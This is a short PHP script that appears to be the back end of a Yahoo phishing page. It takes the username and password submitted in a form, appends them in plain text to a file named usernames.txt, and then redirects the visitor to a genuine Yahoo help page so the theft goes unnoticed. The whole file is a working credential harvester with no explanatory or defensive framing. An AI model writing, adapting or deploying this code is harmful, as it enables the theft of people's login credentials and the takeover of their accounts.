<?php

file_put_contents("usernames.txt", "Yahoo Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://help.yahoo.com/kb/account');
exit();
?>
